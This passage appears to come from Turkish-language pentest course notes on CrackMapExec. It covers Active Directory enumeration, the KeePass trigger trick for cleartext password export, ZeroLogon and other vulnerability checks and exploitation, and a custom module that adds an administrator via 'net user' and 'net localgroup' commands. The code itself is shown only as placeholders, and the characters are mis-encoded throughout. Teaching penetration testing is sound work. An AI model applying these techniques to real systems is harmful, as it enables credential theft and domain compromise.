**[Resource Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)** gibi bazÄ± **attack** senaryolarÄ±nda **domain** iÃ§inde bir **machine** oluÅŸturmak gerekebilir, bu yÃ¼zden **account machine quota attribute**'Ã¼nÃ¼ **enumerate** etmek Ã¶nemlidir.


### Machine Quota Module

{{CODE_BLOCK_201}}


### LDAP Module - daclread

Bir baÅŸka harika modÃ¼l ise bir veya birden fazla object'in `DACL`'lerini okumamÄ±zÄ± ve dÄ±ÅŸa aktarmamÄ±zÄ± saÄŸlayan `daclread`'dir. Bu modÃ¼l Active Directory eriÅŸimini numaralandÄ±rmamÄ±zÄ± saÄŸlayacaktÄ±r. AÅŸaÄŸÄ±daki seÃ§eneklere sahiptir:

### daclread Module Options

{{CODE_BLOCK_202}}

Diyelim ki **`grace`** hesabÄ±nÄ±n tÃ¼m **ACE**'lerini okumak istiyoruz. Bunun iÃ§in **`TARGET`** seÃ§eneÄŸini ve **`ACTION`** olarak **read** kullanabiliriz.


### Grace KullanÄ±cÄ±sÄ±nÄ±n DACL'sini Oku

{{CODE_BLOCK_203}}


AyrÄ±ca belirli haklarÄ± da arayabiliriz, Ã¶rneÄŸin hangi **principal**'larÄ±n **DCSync** haklarÄ±na sahip olduÄŸunu. Bunun iÃ§in **`TARGET_DN`** seÃ§eneÄŸini kullanarak **distinguished domain name (DN)** belirtmemiz, **`ACTION`** olarak **read** seÃ§eneÄŸini seÃ§memiz ve aramak istediÄŸimiz haklarÄ± **`RIGHTS`** seÃ§eneÄŸiyle belirlememiz gerekir.

### DCSync Rights'a Sahip KullanÄ±cÄ±larÄ± Arama

{{CODE_BLOCK_204}}



Ã‡Ä±ktÄ±da gÃ¶sterildiÄŸi gibi, `ACE[4]` `robert` kullanÄ±cÄ±sÄ±nÄ±n hedef domain'de `DCSync` haklarÄ±na sahip olduÄŸunu gÃ¶sterir.

LDAP'ta birkaÃ§ modÃ¼l daha kullanabiliriz. ModÃ¼llerin tam listesini gÃ¶rmek iÃ§in `-L` seÃ§eneÄŸini kullanabiliriz.

### LDAP Protocol Modules

{{CODE_BLOCK_205}}


### SMB Protocol Modules

SMB protokolÃ¼nde daha fazla modÃ¼l mevcuttur. CrackMapExec modÃ¼lÃ¼nde yaptÄ±ÄŸÄ±mÄ±z ÅŸeylerin Ã§oÄŸu SMB protokolÃ¼nÃ¼ kullanÄ±r. Ä°lginÃ§ bilgiler elde etmemizi saÄŸlayacak bazÄ± modÃ¼lleri gÃ¶zden geÃ§irelim.

Not: SMB kullanan modÃ¼llerin Ã§oÄŸunun Ã§alÄ±ÅŸmasÄ± iÃ§in admin haklarÄ±na ( `Pwned!` ) ihtiyaÃ§ vardÄ±r.


### SMB ModÃ¼lleri - get_netconnections ve ioxidresolver

Bir aÄŸ pentesti Ã¼zerinde Ã§alÄ±ÅŸÄ±rken, sÃ¼rekli olarak daha fazla kaynaÄŸa veya aÄŸa eriÅŸim elde etmeye Ã§alÄ±ÅŸÄ±rÄ±z. CrackMapExec, daha Ã¶nce tehlikeye attÄ±ÄŸÄ±mÄ±z bir makineyi numaralandÄ±rmamÄ±za ve birden fazla aÄŸ yapÄ±landÄ±rmasÄ±na sahip olup olmadÄ±ÄŸÄ±nÄ± belirlememize olanak tanÄ±yan bazÄ± modÃ¼llere sahiptir. `get_netconnections` ve `ioxidresolver` modÃ¼llerini kullanalÄ±m ve farklarÄ±nÄ± gÃ¶relim.

`get_netconnections` modÃ¼lÃ¼, aÄŸ baÄŸlantÄ±larÄ±nÄ± sorgulamak iÃ§in `WMI` kullanÄ±r. `IPv6` ve herhangi bir ikincil IP dahil olmak Ã¼zere tÃ¼m IP adreslerinin yanÄ± sÄ±ra domain adÄ±nÄ± da alÄ±r.


### get_netconnections Module

{{CODE_BLOCK_206}}


Ã–te yandan, `ioxidresolver` modÃ¼lÃ¼ IP adreslerini sorgulamak iÃ§in RPC kullanÄ±r. Ancak, bu modÃ¼l `IPv6` adreslerini iÃ§ermez.

### ioxidresolver Module

{{CODE_BLOCK_207}}


Not: Ä°htiyaÃ§larÄ±mÄ±za en uygun olanÄ± seÃ§ebilmemiz iÃ§in bir modÃ¼lÃ¼n nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± anlamak Ã¶nemlidir.


### SMB Module - keepass_discover

`KeePass`, kurumsal aÄŸlarda adminler ve kullanÄ±cÄ±lar tarafÄ±ndan parolalarÄ± ve gizli bilgileri tek bir veritabanÄ±nda saklamak iÃ§in yaygÄ±n olarak kullanÄ±lan Ã¼cretsiz, aÃ§Ä±k kaynaklÄ± bir password manager'dÄ±r. Bir master password onu korur. Bir KeePass veritabanÄ± alÄ±rsak, onu aÃ§mak iÃ§in ÅŸifresine ihtiyacÄ±mÄ±z vardÄ±r.

### KeePass'i KeÅŸfetme

{{CODE_BLOCK_208}}

EÄŸer master parolaya sahip deÄŸilsek bir alternatif de Lee Christensen ( [@tifkin_](https://twitter.com/tifkin_)) ve Will Schroeder ( [@harmj0y](https://twitter.com/harmj0y)) tarafÄ±ndan geliÅŸtirilen ve veritabanÄ±nÄ± aÃ§Ä±k metin olarak dÄ±ÅŸa aktarmak iÃ§in KeePass'Ä±n triger sistemini kullanan bir teknik kullanmaktÄ±r. KeePass yapÄ±landÄ±rma dosyasÄ±nÄ±, veritabanÄ±nÄ± otomatik olarak aÃ§Ä±k metin olarak dÄ±ÅŸa aktaran bir [trigger](https://keepass.info/help/v2/triggers.html) iÃ§erecek ÅŸekilde deÄŸiÅŸtirir.

Bunu kullanmak iÃ§in beÅŸ (5) adÄ±ma ihtiyacÄ±mÄ±z var:

*  KeePass yapÄ±landÄ±rma dosyasÄ±nÄ± bulun. Biz bunu `keepass_discover` modÃ¼lÃ¼ ile yaptÄ±k.
 * `ACTION=ADD` seÃ§eneÄŸini ve `KEEPASS_CONFIG_PATH` Ã¶ÄŸesini kullanarak trigger'Ä± yapÄ±landÄ±rma dosyasÄ±na ekleyin.

### KeePass YapÄ±landÄ±rma DosyasÄ±na Trigger Ekleme

{{CODE_BLOCK_209}}

Not: KeePass yapÄ±landÄ±rma yolu iÃ§in ters eÄŸik Ã§izgi (`/`) veya Ã§ift eÄŸik Ã§izgi (`\`) kullandÄ±ÄŸÄ±nÄ±zdan emin olun.

* KullanÄ±cÄ±nÄ±n KeePass'i aÃ§masÄ±nÄ± ve master parolayÄ± girmesini bekleyin. Bu iÅŸlemi zorlamak iÃ§in `ACTION=RESTART` seÃ§eneÄŸini kullanarak KeePass.exe prosesini yeniden baÅŸlatabiliriz. Hedef makinede oturum aÃ§mÄ±ÅŸ Ã§ok sayÄ±da kullanÄ±cÄ± varsa, `USER=julio` gibi kullanÄ±cÄ± adÄ± ile `USER` seÃ§eneÄŸini ekleyebiliriz.

{{CODE_BLOCK_210}}


`ACTION=POLL` seÃ§eneÄŸini kullanarak export edilen veritabanÄ±nÄ± makinemize sorgulayÄ±n. Daha sonra ÅŸifre giriÅŸlerini aramak iÃ§in grep kullanabiliriz.


### Ele GeÃ§irilen Hedeften Export Verileri Sorgulama

{{CODE_BLOCK_211}}

{{CODE_BLOCK_212}}


`ACTION=CLEAN` seÃ§eneÄŸini ve `KEEPASS_CONFIG_PATH`'i kullanarak yapÄ±landÄ±rma dosyasÄ±nÄ± temizleyin

### Clean Configuration File Changes

{{CODE_BLOCK_213}}


Bu modÃ¼lÃ¼n her seÃ§eneÄŸini Ã¶ÄŸrendik, ancak **`ACTION=ALL`** kullanarak hepsini tek seferde alabiliriz. Bu seÃ§eneÄŸin iyi yanÄ±, **extract_password** yÃ¶ntemini de iÃ§ermesidir; bu yÃ¶ntem **.xml** dosyasÄ±nda herhangi bir parola giriÅŸini arar ve konsola yazdÄ±rÄ±r.


### keeppass_trigger TÃœMÃœNÃœ Tek Komutta Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_214}}

Not: ModÃ¼l ÅŸifreyi yazdÄ±rÄ±rken sorun yaÅŸayabilir. Bir hata alabiliriz, ancak ÅŸifre `/tmp/export.xml` dosyasÄ±nda olacaktÄ±r, bÃ¶ylece manuel olarak alabiliriz.

### RDP'yi EtkinleÅŸtirme veya Devre DÄ±ÅŸÄ± BÄ±rakma

DeÄŸerlendirme yaparken yapmak isteyebileceÄŸimiz yaygÄ±n bir gÃ¶rev, RDP aracÄ±lÄ±ÄŸÄ±yla bir hedef makineye baÄŸlanmaktÄ±r. Bu, baÅŸka tÃ¼rlÃ¼ lateral hareket saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtiremediÄŸimiz veya standart bir protokol kullanarak radarÄ±n altÄ±ndan geÃ§mek istediÄŸimiz bazÄ± senaryolarda yararlÄ± olabilir.

BaÄŸlanmak istediÄŸimiz makinede RDP etkin deÄŸilse, buna izin vermek iÃ§in RDP modÃ¼lÃ¼nÃ¼ kullanabiliriz. `ACTION` seÃ§eneÄŸini ve ardÄ±ndan `enable` veya `disable` seÃ§eneklerini belirtmemiz gerekir.


### RDP'yi EtkinleÅŸtirme

{{CODE_BLOCK_215}}


SMB'de birkaÃ§ modÃ¼l daha vardÄ±r. ModÃ¼llerin tam listesini gÃ¶rmek iÃ§in `-L` seÃ§eneÄŸini kullanabiliriz.


### SMB Protocol Modules

{{CODE_BLOCK_216}}

Bir sonraki bÃ¶lÃ¼mde, ZeroLogon gibi bilinen gÃ¼venlik aÃ§Ä±klarÄ±ndan yararlanan diÄŸer SMB modÃ¼llerine bakacaÄŸÄ±z

### Vulnerability Scan Modules

SÄ±zma testi yaparken gerÃ§ekleÅŸtirdiÄŸimiz gÃ¼nlÃ¼k faaliyetlerden biri gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmeye Ã§alÄ±ÅŸmaktÄ±r. EÄŸer herhangi birini bulabilirsek, exploitation iÅŸi basit olabilir.

CrackMapExec, gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmemizi saÄŸlayan bazÄ± modÃ¼ller iÃ§erir. Bu oturumda bunlardan bazÄ±larÄ±nÄ± inceleyeceÄŸiz.


### Environment'i Ayarlama

Bu senaryoda, bir sunucuyu ele geÃ§irdik ve admin kimlik bilgilerini elde ettik. Bu sunucunun iki aÄŸ kartÄ± var ve amacÄ±mÄ±z domainin saldÄ±rÄ±ya karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirlemek. Domainin IP adresi `172.16.10.3`'tÃ¼r.

Domain'e eriÅŸim saÄŸlamak iÃ§in, CME ile ProxyChain bÃ¶lÃ¼mÃ¼nde Ã¶ÄŸrendiklerimizi kullanacaÄŸÄ±z ve Chisel ile bir baÄŸlantÄ± kuracaÄŸÄ±z


### Chisel'i Hedef Makineye GÃ¶nderme

{{CODE_BLOCK_217}}


### SaldÄ±rÄ± Hostumuzda Chisel'Ä± Sunucu Olarak Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_218}}


### Chisel'Ä± Tehlikeye DÃ¼ÅŸmÃ¼ÅŸ Cihazdan SaldÄ±rÄ± Hostumuza BaÄŸlama

{{CODE_BLOCK_219}}


### Vulnerability Scan Modules

CrackMapExec'teki gÃ¼venlik aÃ§Ä±ÄŸÄ± modÃ¼llerinin Ã§oÄŸu yalnÄ±zca kontrol edilir ve bu modÃ¼lleri gÃ¼venlik aÃ§Ä±klarÄ±ndan yararlanmak iÃ§in kullanamayÄ±z. [ZeroLogon gÃ¼venlik aÃ§Ä±ÄŸÄ±](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) ile baÅŸlayalÄ±m.


### ZeroLogon

KimliÄŸi doÄŸrulanmamÄ±ÅŸ bir saldÄ±rgan, bir domain controller'a aÄŸ eriÅŸimi ile[ ZeroLogon gÃ¼venlik aÃ§Ä±ÄŸÄ±ndan (CVE-2020-1472)](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) faydalanabilir. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± kÃ¶tÃ¼ye kullanmak ve sonunda domain'in controller'Ä± ele geÃ§irmek iÃ§in savunmasÄ±z bir Netlogon session'Ä± baÅŸlatmasÄ± gerekir. Bir Domain Controller'a baÄŸlanmak baÅŸarÄ±lÄ± bir saldÄ±rÄ± iÃ§in tek Ã¶n koÅŸul olduÄŸundan, gÃ¼venlik aÃ§Ä±ÄŸÄ± ciddidir.

CrackMapExec, bir Domain Controller'Ä±n ZeroLogon'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan zerologon adlÄ± bir modÃ¼l iÃ§erir.


### ZeroLogon GÃ¼venlik AÃ§Ä±ÄŸÄ± KontrolÃ¼

{{CODE_BLOCK_220}}


### PetitPotam

GÃ¼venlik araÅŸtÄ±rmacÄ±sÄ± [Gilles Lionel](https://twitter.com/topotam77) kÄ±sa bir sÃ¼re Ã¶nce [PetitPotam](https://github.com/topotam/PetitPotam) adÄ± verilen ve saldÄ±rganlarÄ±n sadece kurumsal aÄŸ altyapÄ±sÄ±na eriÅŸim saÄŸlayarak domain'i tehlikeye atmasÄ±na olanak tanÄ±yan bir saldÄ±rÄ± tekniÄŸini ortaya Ã§Ä±kardÄ±. YÃ¶ntem, sunulan herhangi bir sunucu servisine (Ã¶rneÄŸin bir Domain Controller) yÃ¶nelik klasik bir `NTLM relay` saldÄ±rÄ±sÄ±dÄ±r. Lionel ayrÄ±ca [GitHub PetitPotam](https://github.com/topotam/PetitPotam)'da saldÄ±rganlarÄ±n domain'i ele geÃ§irmek iÃ§in bu Ã¶zel saldÄ±rÄ± tekniÄŸini nasÄ±l kullanabileceklerini gÃ¶steren bir proof of  concept kodu da yayÄ±nladÄ±.

CrackMapExec, bir Domain Controller'Ä±n PetitPotam'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan `petitpotam` adlÄ± bir modÃ¼l iÃ§erir.


### Petitpotam GÃ¼venlik AÃ§Ä±ÄŸÄ± KontrolÃ¼

{{CODE_BLOCK_221}}


### noPAC

noPAC gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ±n exploit'i, normal bir domain kullanÄ±cÄ±sÄ±nÄ±n ayrÄ±calÄ±klarÄ±nÄ±n bir domain admin yÃ¼kseltilmesine izin verdi. Kavram kanÄ±tÄ± (PoC) [GitHub](https://github.com/Ridter/noPac)'da yayÄ±nlandÄ±.

CrackMapExec, bir domain controller'Ä±n noPAC'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan nopac adlÄ± bir modÃ¼l iÃ§erir.


### noPAC vulnerability check

{{CODE_BLOCK_222}}



### DFSCoerce

[Filip Dragovic](https://twitter.com/filip_dragovic), DFSCoerce adlÄ± bir NTLM relay saldÄ±rÄ±sÄ± iÃ§in bir kavram kanÄ±tÄ± ([PoC](https://github.com/Wh04m1001/DFSCoerce)) yayÄ±nladÄ±. YÃ¶ntem, bir Windows domain'inin controller'Ä± ele geÃ§irmek iÃ§in Distributed File System: Namespace Management Protocol (MS-DFSNM) kullanarak bir Windows domain'inin kontrolÃ¼nÃ¼ ele geÃ§iriyor.

Bu saldÄ±rÄ± bir domain kullanÄ±cÄ±sÄ± gerektirir ve bir DC'nin savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirlemek iÃ§in CrackMapExec modÃ¼lÃ¼ `dfscoerce`'yi kullanabiliriz. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± kontrol etmek iÃ§in `Y3t4n0th3rP4ssw0rd` ÅŸifresiyle `carole.holmes` hesabÄ±nÄ± kullanacaÄŸÄ±z.


### DFSCoerce Vulnerability Check

{{CODE_BLOCK_223}}


### ShadowCoerce

ShadowCoerce, gÃ¼venlik araÅŸtÄ±rmacÄ±sÄ± Lionel Gilles tarafÄ±ndan 2021'in sonlarÄ±nda PetitPotam saldÄ±rÄ±sÄ±nÄ± sergileyen bir sunumun sonunda keÅŸfedildi ve ilk kez detaylandÄ±rÄ±ldÄ±. [Charlie Bromberg](https://twitter.com/_nwodtuhs) bir kavram kanÄ±tÄ± ([PoC](https://github.com/ShutdownRepo/ShadowCoerce)) oluÅŸturdu.

CrackMapExec modÃ¼lÃ¼ shadowcoerce kullanarak DC'nin bu saldÄ±rÄ±ya karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in carole.holmes hesabÄ±nÄ± kullanalÄ±m.


### ShadowCoerce Vulnerability Check

{{CODE_BLOCK_224}}


GÃ¼venlik aÃ§Ä±ÄŸÄ± tarama modÃ¼llerinin Ã§oÄŸu yazarÄ±, bilgisayarÄ±n gÃ¼venlik aÃ§Ä±ÄŸÄ± olup olmadÄ±ÄŸÄ±na dair bir mesaj eklememiÅŸtir, bu nedenle komut Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ktan sonra hiÃ§bir ÅŸey gÃ¶rmeyiz. Ancak, ( `./CrackMapExec/cme/modules/shadowcoerce.py`) adresinde bulunan shadowcoerse modÃ¼lÃ¼nÃ¼n kaynak kodunu kontrol edersek, yazarÄ±n ( `logging.debug` ) ile bazÄ± debug log'larÄ± eklediÄŸini gÃ¶receÄŸiz. CrackMapExec'i hata debug modunda Ã§alÄ±ÅŸtÄ±rÄ±rsak, bu loglarÄ± yazdÄ±racaktÄ±r.

CrackMapExec'i debug modunda Ã§alÄ±ÅŸtÄ±rmak iÃ§in protokolden Ã¶nce `--verbose` seÃ§eneÄŸini kullanabiliriz


### shadowcoerce ModÃ¼lÃ¼nÃ¼ Verbose Enabled ile Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_225}}


`DEBUG` ile baÅŸlayan satÄ±rlar `logging.debug`'a karÅŸÄ±lÄ±k gelir. Son satÄ±rlarda hedefin savunmasÄ±z olmadÄ±ÄŸÄ±nÄ± gÃ¶sterdiÄŸini gÃ¶rebiliriz.


### MS17-010 (EternalBlue)

MS17-010, diÄŸer adÄ±yla EternalBlue, Windows iÅŸletim sistemleri iÃ§in Microsft tarafÄ±ndan 14 Mart 2017 tarihinde yayÄ±nlanan bir gÃ¼venlik yamasÄ±dÄ±r. Yama, SMB servisindeki kritik bir kimliÄŸi doÄŸrulanmamÄ±ÅŸ remote kod Ã§alÄ±ÅŸtÄ±rma aÃ§Ä±ÄŸÄ± iÃ§indir. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ± hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft GÃ¼venlik BÃ¼lteni MS17-010](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010?redirectedfrom=MSDN) - Kritik'i okuyabiliriz.

CrackMapExec, bir domain controller'Ä±n MS17-010'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirleyen ms17-010 adlÄ± bir modÃ¼l iÃ§erir.


### MS17-010 Vulnerability Check

{{CODE_BLOCK_226}}


### GÃ¼venlik AÃ§Ä±ÄŸÄ±ndan Yararlanma

BirÃ§ok gÃ¼venlik aÃ§Ä±ÄŸÄ± gÃ¶rdÃ¼k. Onlardan birini exploit etmeye Ã§alÄ±ÅŸalÄ±m: ZeroLogon. ModÃ¼l tarafÄ±ndan saÄŸlanan baÄŸlantÄ±ya gidelim https://github.com/dirkjanm/CVE-2020-1472 ve onu kullanalÄ±m:


### Exploiting ZeroLogon

{{CODE_BLOCK_227}}

{{CODE_BLOCK_228}}


Zaman geÃ§tikÃ§e yeni gÃ¼venlik aÃ§Ä±klarÄ± ortaya Ã§Ä±kacaktÄ±r ve bunlar sektÃ¶r uzmanlarÄ± veya bizim tarafÄ±mÄ±zdan CrackMapExec'e modÃ¼l olarak eklenebilir. Bir sonraki bÃ¶lÃ¼mde, CrackMapExec iÃ§in nasÄ±l bir modÃ¼l oluÅŸturabileceÄŸimizi gÃ¶receÄŸiz.

---

### Kendi CME ModÃ¼lÃ¼mÃ¼zÃ¼ OluÅŸturmak

Yazarlar ve topluluk tarafÄ±ndan oluÅŸturulan birÃ§ok yerleÅŸik CrackMapExec modÃ¼lÃ¼nÃ¼ kullandÄ±k. Bu bÃ¶lÃ¼mde CrackMapExec iÃ§in modÃ¼lÃ¼mÃ¼zÃ¼ nasÄ±l yapabileceÄŸimizi keÅŸfedeceÄŸiz.


### CrackMapExec'i Poetry ile derleyin

ModÃ¼lÃ¼mÃ¼zÃ¼ oluÅŸturmadan Ã¶nce, CrackMapExec projesinin nasÄ±l derleneceÄŸini bilmek Ã§ok Ã¶nemlidir. Bu amaÃ§la CME, projelerimizi oluÅŸtururken Ã¶nerilen [Poetry](https://python-poetry.org/)'yi kullanÄ±r. Poetry kullanmÄ±yorsanÄ±z, CrackMapExec'i Ã§alÄ±ÅŸtÄ±rmak Ã¼zere Poetry kullanmaya baÅŸlamak iÃ§in Kurulum ve Binaryler bÃ¶lÃ¼mÃ¼ne bir gÃ¶z atÄ±n

Åimdi kodu en sevdiÄŸimiz IDE ile aÃ§abiliriz. Bu bÃ¶lÃ¼mde [VSCode](https://code.visualstudio.com/) kullanacaÄŸÄ±z. VSCode'u [kurmak](https://code.visualstudio.com/download) iÃ§in .deb dosyasÄ±nÄ± kendi web sitesinden indirmemiz gerekiyor. DoÄŸrudan indirme baÄŸlantÄ±sÄ± [burada](https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64).


### VSCode'un KurulmasÄ± ve Ã‡alÄ±ÅŸtÄ±rÄ±lmasÄ±

{{CODE_BLOCK_229}}

Daha sonra aÃ§mak iÃ§in `code` yazabiliriz 

{{CODE_BLOCK_230}}

![Pasted image 20241203150456.png](/img/user/resimler/Pasted%20image%2020241203150456.png)


### Yeni ModÃ¼lÃ¼mÃ¼zÃ¼ OluÅŸturun

ModÃ¼lÃ¼mÃ¼zÃ¼ oluÅŸturalÄ±m. Yeni bir administrator hesabÄ± oluÅŸturacak basit bir script oluÅŸturacaÄŸÄ±z.

* ./CrackMapExec/cme/modules klasÃ¶rÃ¼ altÄ±nda `createadmin.py` adÄ±nda bir dosya oluÅŸturun.
* AÅŸaÄŸÄ±daki kod Ã¶rneÄŸini dosyaya kopyalayÄ±n:

{{CODE_BLOCK_231}}



* Åimdi modÃ¼lÃ¼mÃ¼zÃ¼ Ã¶zelleÅŸtirelim.

BazÄ± deÄŸiÅŸkenleri tanÄ±mlamamÄ±z gerekiyor:

* `name`, modÃ¼l adÄ±nÄ± nasÄ±l Ã§aÄŸÄ±racaÄŸÄ±mÄ±zÄ± belirtir. Bu durumda, `createadmin` dosya adÄ±nÄ± kullanacaÄŸÄ±z.
* `description` modÃ¼lÃ¼n amacÄ± iÃ§in kÄ±sa bir aÃ§Ä±klamadÄ±r. Biz bunu `Create a new administrator account` ayarlayacaÄŸÄ±z.
* `supported_protocols`, modÃ¼lÃ¼ kullanmak iÃ§in desteklenen protokolÃ¼n bir dizisidir. Biz sadece `SMB` kullanacaÄŸÄ±z.
* `opsec_safe`, modÃ¼lÃ¼n Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±nÄ±n gÃ¼venli olduÄŸu anlamÄ±na gelen bir `True` veya `False` deÄŸeridir.
* `multiple_hosts`, bu modÃ¼lÃ¼ birden fazla hedefe karÅŸÄ± Ã§alÄ±ÅŸtÄ±rabileceÄŸimiz anlamÄ±na gelir.

AyrÄ±ca, modÃ¼l iÃ§in deÄŸiÅŸkenleri tanÄ±mlamak iÃ§in kullanÄ±lan `options()` methoduna da sahip olacaÄŸÄ±z. Bu durumda, `USER` ve `PASS` olmak Ã¼zere iki seÃ§enek ekleyeceÄŸiz. Her seÃ§eneÄŸin varsayÄ±lan deÄŸeri olabilir ya da olmayabilir. Bu yazara baÄŸlÄ±dÄ±r. USER iÃ§in varsayÄ±lan deÄŸeri dÃ¼z metin olarak ve PASS iÃ§in varsayÄ±lan deÄŸeri `asdasd123` . AyrÄ±ca USER o PASS modÃ¼l seÃ§eneÄŸinin boÅŸ olup olmadÄ±ÄŸÄ±nÄ± doÄŸrulamak iÃ§in bir kontrol ekledik. EÄŸer durum buysa, modÃ¼lden Ã§Ä±kÄ±lacaktÄ±r.

{{CODE_BLOCK_232}}

* Daha sonra, `on_admin_login()` metodunu kullanarak execute ile Ã§alÄ±ÅŸacaÄŸÄ±z. Bu metot deÄŸiÅŸkenlerimizi almaktan ve hedeflere istediÄŸimiz herhangi bir gÃ¶revi yÃ¼rÃ¼tmekten sorumludur. Ã‡Ä±ktÄ± olarak `context.log.info` ve `context.log.highlight` metotlarÄ±nÄ± kullanacaÄŸÄ±z (farklÄ± renklere sahipler).

Bu execute iÃ§in, yÃ¶ntemin `connection.execute(command, True)` komutunu kullanarak bir `cmd.exe` komutu Ã§alÄ±ÅŸtÄ±racaÄŸÄ±z. Komutumuz, yeni bir kullanÄ±cÄ± eklemek iÃ§in `net user username password /add /Y` deÄŸeriyle ve kullanÄ±cÄ±yÄ± administrators grubuna eklemek iÃ§in `net localgroup administrators username /add` deÄŸeriyle command deÄŸiÅŸkenine kaydedilecektir.

{{CODE_BLOCK_233}}


Son olarak, yeni modÃ¼lÃ¼mÃ¼z ÅŸu ÅŸekilde gÃ¶rÃ¼nmelidir:

{{CODE_BLOCK_234}}


### ModÃ¼lÃ¼mÃ¼zÃ¼ Ã‡alÄ±ÅŸtÄ±rma

Åimdi modÃ¼lÃ¼mÃ¼zÃ¼ herhangi bir seÃ§enekle veya herhangi bir seÃ§enek olmadan Ã§alÄ±ÅŸtÄ±rabiliriz. Ã–nce varsayÄ±lan deÄŸerlerle Ã§alÄ±ÅŸtÄ±rarak sonuÃ§larÄ± gÃ¶relim.


### CME ModÃ¼lÃ¼mÃ¼zÃ¼n Ã‡alÄ±ÅŸtÄ±rÄ±lmasÄ± createadmin

{{CODE_BLOCK_235}}

Daha sonra, hem kullanÄ±cÄ± adÄ± hem de parola belirterek Ã§alÄ±ÅŸtÄ±rabiliriz.

{{CODE_BLOCK_236}}


Ä°lk modÃ¼lÃ¼mÃ¼z Ã§alÄ±ÅŸÄ±yor, ancak Ã§ok daha iyi olabilir. YÃ¼rÃ¼tmeyi iki komuta bÃ¶lebilir ve kullanÄ±cÄ± zaten oluÅŸturulmuÅŸsa veya ÅŸifre politikalara uymuyorsa bir hata gÃ¶sterebiliriz.

AyrÄ±ca `context.log.highlight(p)`'den deÄŸeri alabilir ve bir hata varsa farklÄ± bir ÅŸey gÃ¶sterebiliriz. Bu kodu geliÅŸtirmek iÃ§in fikirleriniz nelerdir?

### DiÄŸer Yazarlardan Ã–ÄŸrenmek

ArtÄ±k yeni bir modÃ¼l oluÅŸturmanÄ±n temellerini Ã¶ÄŸrendiÄŸimize gÃ¶re, diÄŸer modÃ¼lleri keÅŸfetmeli ve birkaÃ§ fikir edinmeliyiz.

Ã–rneÄŸin, `procdump.py` modÃ¼lÃ¼ `procdump.exe` Ã§alÄ±ÅŸtÄ±rÄ±labilir dosyasÄ±nÄ± bir `Base64` string olarak kaydeder, ardÄ±ndan Base64 stringini bir dosyaya dÃ¶nÃ¼ÅŸtÃ¼rÃ¼r ve hedef iÅŸletim sisteminde tutar. LSASS'Ä±n iÅŸlem kimliÄŸini almak iÃ§in `tasklist` komutunu Ã§alÄ±ÅŸtÄ±rÄ±r, bunu bir deÄŸiÅŸkene kaydeder ve process kimliÄŸini procdump.exe'nin yÃ¼rÃ¼tÃ¼lmesine bir argÃ¼man olarak geÃ§irir.

BaÅŸka bir Ã¶rnek `get_description.py` . Bu modÃ¼lÃ¼ `groupmembership` modÃ¼lÃ¼nÃ¼ oluÅŸturmak iÃ§in Ã¶rnek olarak aldÄ±k. Bu modÃ¼l, bir sorgu gerÃ§ekleÅŸtirmek ve `memberOf` attribute'unu almak iÃ§in ihtiyaÃ§ duyduÄŸumuz gibi, sonuÃ§larÄ±nÄ± bir LDAP sorgusuna dayalÄ± olarak alÄ±r. Kodda bazÄ± deÄŸiÅŸiklikler yaptÄ±k, yeni bir modÃ¼l oluÅŸturduk ve bir pull request gÃ¶nderdik. Pull request kabul edildikten sonra tÃ¼m topluluk tarafÄ±ndan kullanÄ±labilir olacaktÄ±r.

Yeni modÃ¼ller oluÅŸturmak iÃ§in MSSQL gibi diÄŸer protokoller iÃ§in baÅŸka Ã¶rneklere de bakabiliriz.


### Pull Request OluÅŸturma

CrackMapExec gibi bir proje topluluk tarafÄ±ndan canlÄ± tutulur. ModÃ¼lÃ¼mÃ¼zÃ¼n tÃ¼m topluluk tarafÄ±ndan kullanÄ±labilir hale geleceÄŸi ve aracÄ±n kendisinin bir parÃ§asÄ± olarak dahil edileceÄŸi bir pull request'i ekleyerek projeye katkÄ±da bulunabiliriz.

Bir pull request'i yapmak iÃ§in [GitHub](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request) kÄ±lavuzunu takip edebilir ve CrackMapExec'e katkÄ±da bulunabiliriz.

Ä°lerleyen bÃ¶lÃ¼mlerde, CrackMapExec kullanÄ±mÄ± iÃ§in `IPv6`, `Kerberos Kimlik DoÄŸrulama` ve `CrackMapExec` veritabanÄ±nda uzmanlaÅŸma gibi bazÄ± bonus konularÄ± tartÄ±ÅŸacaÄŸÄ±z.


### Ek CME Ä°ÅŸlevselliÄŸi

CrackMapExec, Ã§eÅŸitli senaryolarda Ã§ok faydalÄ± olacak baÅŸka yardÄ±mcÄ± programlara da sahiptir. Bu bÃ¶lÃ¼mde, bunlardan Ã¼Ã§Ã¼nÃ¼ inceleyeceÄŸiz:

* Audit mode
* IPv6 desteÄŸi
* Birden fazla cihaza saldÄ±rÄ±rken tamamlanma yÃ¼zdesi

### Audit Mode

